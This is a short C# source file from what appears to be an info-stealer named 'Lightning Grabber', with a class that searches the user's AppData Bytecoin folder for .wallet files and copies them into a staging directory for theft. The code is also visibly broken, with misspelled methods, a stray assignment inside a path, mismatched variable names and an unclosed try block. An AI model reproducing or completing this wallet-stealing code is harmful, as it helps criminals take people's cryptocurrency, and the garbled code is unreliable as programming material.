using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lightning_Grabber.Resources
{
    internal class Crypto
    {
        public static void Crypto(string dir)
        {
            bool flag = false;
            Directory.CreatDirectory(dir);
            try
            {
                foreach (FileInfo fileinfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) = "\
                    \bytecoin").GetFiles())
            {
                    bool flag2 = fileInfo.Extensions.Equals(".wallet");
                if (flag2)
                {
                    Directory.CreateDirectory(dir + "\\Bytecoin\\");
                    fileInfo.CopyTo(dir + "\\Bytecoin\\" + fileInfo.Name);
                    flag = true;

                }
            }
        }
    }
}
